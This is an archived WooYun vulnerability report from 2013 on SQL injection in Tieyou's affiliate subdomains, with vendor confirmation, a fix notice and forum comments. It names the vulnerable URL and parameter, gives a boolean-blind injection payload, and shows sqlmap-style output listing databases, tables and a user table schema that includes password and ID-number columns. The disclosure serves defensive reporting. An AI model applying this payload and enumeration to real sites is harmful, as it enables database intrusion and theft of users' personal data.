{"id": 6679, "wybug_id": "wooyun-2013-044667", "wybug_title": "敏感信息泄露#铁友网盟SQL注入漏洞", "wybug_corp": "铁友网", "wybug_author": "adm1n", "wybug_date": "2013-12-02 10:57", "wybug_open_date": "2014-01-16 10:57", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-16：\t细节向公众公开  简要描述： 铁友网盟SQL注入漏洞 详细说明：  1.http://tj.tieyou.com/index.php?param=/notice/detail&id=342.http://union.tieyou.com/index.php?param=/notice/detail&id=26通过观察，这两个分站都是使用同一个数据库available databases [3]:[*] `union`[*] information_schema[*] test   漏洞证明：  Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: param=/notice/detail&id=26 AND 7442=7442---[14:58:49] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.15back-end DBMS: MySQL 5current user:    'wangmeng@172.22.128.131'available databases [3]:[*] `union`[*] information_schema[*] testDatabase: union[32 tables]+---------------------------------------+| stat_admins                           || stat_channel_hash                     || stat_copy_logs                        || stat_orders                           || stat_positions                        || stat_tmp_insurance_status             || stat_tmp_order_status                 || stat_tmp_ordertype                    || tbl_ad                                || tbl_admin_auth                        || tbl_admin_log                         || tbl_admin_menu                        || tbl_admin_user                        || tbl_admin_user_operate_log            || tbl_data_service                      || tbl_flight_order                      || tbl_friend                            || tbl_hotel_order                       || tbl_messagebox                        || tbl_notice                            || tbl_push_channel_train_order_config   || tbl_push_train_order_log              || tbl_user                              || tbl_user_account                      || tbl_user_account_log                  || tbl_user_bank_account                 || tbl_user_push_order                   || tbl_user_settlement_apply             || tbl_user_settlement_apply_operate_log || tbl_user_site                         || tbl_user_site_order                   || tbl_user_site_success_order           |+---------------------------------------+Database: information_schema[16 tables]+---------------------------------------+| CHARACTER_SETS                        || COLLATIONS                            || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS                               || COLUMN_PRIVILEGES                     || KEY_COLUMN_USAGE                      || ROUTINES                              || SCHEMATA                              || SCHEMA_PRIVILEGES                     || STATISTICS                            || TABLES                                || TABLE_CONSTRAINTS                     || TABLE_PRIVILEGES                      || TRIGGERS                              || USER_PRIVILEGES                       || VIEWS                                 |+---------------------------------------+Database: unionTable: tbl_user[24 columns]+-----------------+---------------+| Column          | Type          |+-----------------+---------------+| address         | varchar(250)  || charge_price    | decimal(10,2) || charge_type     | char(1)       || company_name    | varchar(50)   || contact_name    | varchar(15)   || create_dttm     | datetime      || email           | varchar(100)  || flight_charge   | decimal(5,4)  || hotel_charge    | decimal(5,4)  || ICP             | int(11)       || id              | int(11)       || id_number       | varchar(18)   || last_login_dttm | datetime      || mobile_num      | varchar(11)   || msn             | varchar(50)   || phone_num       | varchar(50)   || qq              | varchar(20)   || real_name       | varchar(15)   || real_pass       | varchar(15)   || update_dttm     | datetime      || user_id         | varchar(15)   || user_pwd        | varchar(15)   || user_status     | char(1)       || user_type       | char(1)       |+-----------------+---------------+\n\n   修复方案：  过滤   版权声明：转载请注明来源 adm1n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-04 16:36 厂商回复： 已确认，感谢adm1n 最新状态： 2014-01-16：已修复，感谢。  ", "replys": "漏洞评价：\n评论\n     2013-12-04 19:13 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  @铁友网，弱弱的问一下，有木有礼物......    \n     2013-12-04 20:54 |    \t\t校长 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:10        | 本人受《中华人民共和国未成年人保护法》《...)\t\t \n  @adm1n 送你张回家的票    \n     2013-12-04 20:55 |    \t\t校长 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:10        | 本人受《中华人民共和国未成年人保护法》《...)\t\t \n  @adm1n 记得要软卧    \n     2013-12-06 09:48 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  @校长 校长不用去学校么~    \n     2013-12-06 17:55 |    \t\t校长 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:10        | 本人受《中华人民共和国未成年人保护法》《...)\t\t \n  @adm1n 蓝翔技校欢迎你    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}